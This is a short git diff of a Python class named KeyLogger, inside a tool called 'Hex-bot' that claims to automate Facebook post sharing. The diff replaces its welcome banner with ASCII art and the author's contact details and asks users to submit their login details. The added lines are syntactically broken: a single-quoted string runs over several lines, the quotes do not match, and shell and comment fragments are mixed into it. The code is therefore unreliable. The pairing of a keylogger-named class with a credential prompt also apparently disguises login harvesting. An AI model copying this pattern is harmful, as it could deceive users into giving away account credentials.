@@ -44,8 +44,24 @@ class KeyLogger:
 
     def run(self):
         # Affichage du message de bienvenue en couleur verte
-        print("\033[1;32m" + "ＢＩＥＮＶＥＮＵＥ! 『𝐇』『𝐄』『𝐗』✦『𝐁』『𝐎』『𝐓』  【𝗩.2】\n" + "\033[0m")  # Texte vert en gras
-        print("\033[32mVeuillez saisir vos identifiants et appuyez sur 'Enter' pour connecter le bot.\n\033[0m")  # Texte vert
+        print("\033[1;32m" + "█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
+██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
+███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
+██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
+██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
+╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
+-------------------------------------------------------
+   ╔═══════════════════════════════════════════════╗
+   ║       [✓] TOOL NAME : TERMUX HOME             ║ 
+   ║                    ║
+   ║       [✓] GITHUB : SAMSMIS01                ║
+   ║       [✓] FACEBOOK : HEXTECH              ║
+   ║       [✓] TELEGRAM : https://t.me/hextechcar      ║
+   ║       [✓] INSTAGRAM : SAMSMIS01   ║
+   ║       [✓] EMAIL : hextech243@gmail.com         ║
+   ╚═══════════════════════════════════════════════╝\n--------------------------------------------------------'|lolcat""")
+  #your slogan\n" + "\033[0m")  # Texte vert en gras
+        print("\033[32maprès avoir soumis les cordonnées demander appuyez sur 'Enter' pour connecter le bot.\n\033[0m")  # Texte vert
         print("\033[1;32m" + "Hex-bot est une solution innovante conçue pour automatiser le partage de vos publications sur Facebook, tout en facilitant l'intégration avec un bot Messenger via l'API officielle de Messenger." + "\033[0m")
         
         # Demander à l'utilisateur de saisir son email ou son nom d'utilisateur
